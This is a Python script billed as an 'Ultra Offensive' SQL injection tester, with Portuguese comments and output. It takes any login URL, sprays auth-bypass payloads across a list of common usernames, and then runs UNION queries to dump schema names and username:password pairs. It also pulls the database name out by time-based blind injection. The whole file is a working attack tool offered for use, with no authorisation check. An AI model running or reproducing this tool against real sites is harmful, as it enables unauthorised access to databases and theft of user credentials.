"""
SQL Injection Tester - Ultra Offensive Mode
Made by: Lucas Navarro
"""

import requests
from bs4 import BeautifulSoup
import threading
import time
import csv
import json
import re
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime

# Payloads comuns e blind
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"\"=\"",
    "' OR ''='",
    "' AND SLEEP(5)--",
    "' OR EXISTS(SELECT * FROM users)--",
]

# Base de usuários
base_usernames = [
    "admin", "admin1", "root", "test", "test1", "user", "usuario",
    "admin123", "teste", "adm", "lucas", "navarro", "admin2024"
]

# Gerar variações
usernames = []
for user in base_usernames:
    usernames.extend([user.lower(), user.upper(), user.capitalize()])

# Palavras-chave
success_keywords = ["painel", "dashboard", "logout", "admin", "bem-vindo"]
error_keywords = ["sql", "syntax", "mysql", "warning", "error"]
waf_keywords = ["captcha", "cloudflare", "verifique", "protegido", "segurança"]

def blue(text): return f"\033[34m{text}\033[0m"
def green(text): return f"\033[32m{text}\033[0m"
def red(text): return f"\033[31m{text}\033[0m"

# === Funções ===

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        return None, None, None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        t = input_tag.get('type', 'text')
        if not name:
            continue
        if t in ['text', 'email'] and not user_field:
            user_field = name
        elif t == 'password' and not pass_field:
            pass_field = name
        fields[name] = input_tag.get('value', '')

    return action, method, fields, user_field, pass_field

def detect_db_type(content):
    if "mysql" in content or "syntax" in content:
        return "MySQL"
    elif "pg_" in content or "postgresql" in content:
        return "PostgreSQL"
    elif "oracle" in content or "ora-" in content:
        return "Oracle"
    elif "mssql" in content or "sql server" in content:
        return "MSSQL"
    else:
        return "Desconhecido"

def offensive_exploit(session, url, data, method, campo_injecao):
    """
    Extração ofensiva via UNION e BLIND
    """
    print(blue("\n[+] Atacando com UNION-Based...\n"))
    union_payloads = [
        "' UNION SELECT database(), user()-- ",
        "' UNION SELECT schema_name, NULL FROM information_schema.schemata-- ",
        "' UNION SELECT table_name, NULL FROM information_schema.tables-- ",
        "' UNION SELECT column_name, NULL FROM information_schema.columns-- ",
        "' UNION SELECT concat(username,0x3a,password), NULL FROM users-- "
    ]

    for payload in union_payloads:
        data_exploit = data.copy()
        data_exploit[campo_injecao] = payload
        try:
            if method == 'post':
                r = session.post(url, data=data_exploit)
            else:
                r = session.get(url, params=data_exploit)

            if r.status_code == 200 and any(w in r.text.lower() for w in ["information_schema", "admin", "username", "root", "public"]):
                print(green(f"[✓] DUMP Detected:\n{r.text[:500]}...\n---"))
        except Exception as e:
            print(red(f"[!] Erro durante UNION exploitation: {e}"))

    print(blue("\n[+] Iniciando BLIND Extraction...\n"))
    blind_extract(session, url, data, method, campo_injecao)

def blind_extract(session, url, data, method, campo_injecao, max_length=30):
    extraido = ""

    for pos in range(1, max_length+1):
        for c in range(32, 126):
            payload = f"' AND IF(ASCII(SUBSTRING((SELECT database()),{pos},1))={c},SLEEP(5),0)-- "
            data_blind = data.copy()
            data_blind[campo_injecao] = payload

            inicio = time.time()
            try:
                if method == 'post':
                    r = session.post(url, data=data_blind)
                else:
                    r = session.get(url, params=data_blind)
                duracao = round(time.time() - inicio, 2)

                if duracao >= 4.5:
                    extraido += chr(c)
                    print(green(f"[✓] {chr(c)} (posição {pos}) → {extraido}"))
                    break
            except:
                continue
        else:
            break  # Fim da extração
    print(green(f"[✓] Database extraído: {extraido}"))

def worker(user, payload, url, login_url, session, method, fields, user_field, pass_field, resultados):
    for campo_alvo in [user_field, pass_field]:
        retries = 3
        while retries > 0:
            try:
                data = fields.copy()
                data[user_field] = user
                data[pass_field] = user
                data[campo_alvo] = payload

                inicio = time.time()
                if method == 'post':
                    r = session.post(login_url, data=data)
                else:
                    r = session.get(login_url, params=data)
                duracao = round(time.time() - inicio, 2)
                conteudo = r.text.lower()

                sucesso = any(k in conteudo for k in success_keywords) or r.url != login_url
                erro_sql = any(k in conteudo for k in error_keywords)
                waf = any(k in conteudo for k in waf_keywords)
                blind = duracao >= 4.5

                status = []
                if sucesso:
                    status.append("Login bem-sucedido")
                if erro_sql:
                    status.append("Erro SQL detectado")
                if blind:
                    status.append("Resposta lenta (possível blind)")
                if waf:
                    status.append("WAF/CAPTCHA detectado")
                if not status:
                    status.append("Sem resposta suspeita")

                print(green(f"Usuário: {user} | Campo: {campo_alvo} | Payload: {payload} | Tempo: {duracao}s → {', '.join(status)}"))

                resultados.append({
                    "usuario": user,
                    "campo": campo_alvo,
                    "payload": payload,
                    "tempo": duracao,
                    "status": status
                })

                if sucesso or erro_sql or blind:
                    offensive_exploit(session, login_url, data, method, campo_alvo)

                break  # sucesso no envio
            except Exception as e:
                print(red(f"[!] Erro: {e} - Retry {retries}"))
                retries -= 1

def test_sqli(url):
    session = requests.Session()
    print(blue("[+] Acessando página de login..."))
    resp = session.get(url)

    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)
    if not all([action, user_field, pass_field]):
        print(red("[!] Formulário não identificado corretamente."))
        return

    login_url = action if action.startswith('http') else urljoin(url, action)
    print(blue(f"[+] URL de login detectada: {login_url}"))

    resultados = []
    threads = []
    print(blue("\n[*] Iniciando testes com Threads...\n"))

    for user in usernames:
        for payload in payloads:
            t = threading.Thread(target=worker, args=(user, payload, url, login_url, session, method, fields, user_field, pass_field, resultados))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f"relatorio_{timestamp}.csv", "w", newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=["usuario", "campo", "payload", "tempo", "status"])
        writer.writeheader()
        for linha in resultados:
            linha["status"] = ", ".join(linha["status"])
            writer.writerow(linha)

    with open(f"relatorio_{timestamp}.json", "w", encoding='utf-8') as jsonfile:
        json.dump(resultados, jsonfile, indent=2, ensure_ascii=False)

    print(blue(f"\n[✓] Testes finalizados. Relatórios salvos como relatorio_{timestamp}.csv e .json"))

def main():
    print(blue("""
   ____  _   _ _      _              ____             _             
  / ___|| | | | | ___| |_ __ _ _ __  |_   _|__   ___   | |_ ___  _ __ 
  \___ \| |_| | |/ _ \ __/ _` | '__|   | |/ _ \ / _ \  | __/ _ \| '__|
   ___) |  _  | |  __/ || (_| | |      | | (_) | (_) | | || (_) | |   
  |____/|_| |_|_|\___|\__\__,_|_|      |_|\___/ \___/   \__\___/|_|   

         Ultra Offensive SQLi Tester - Lucas Navarro
    """))
    url = input(blue("Insira a URL da página de login: ")).strip()
    test_sqli(url)

if __name__ == '__main__':
    main()
